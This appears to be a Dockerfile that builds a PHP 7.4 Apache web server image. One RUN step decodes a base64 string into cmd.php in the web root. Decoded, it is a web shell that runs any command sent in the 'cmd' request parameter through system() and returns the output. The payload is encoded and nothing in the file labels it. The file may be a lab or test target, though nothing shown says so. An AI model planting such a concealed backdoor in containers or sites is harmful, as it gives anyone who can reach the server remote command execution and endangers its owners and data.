FROM php:7.4.27-apache

WORKDIR /var/www/html

RUN echo "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4=" | base64 -d > /var/www/html/cmd.php

RUN apt update

RUN apt install python3 -y

EXPOSE 80

CMD ["apachectl", "-D", "FOREGROUND"]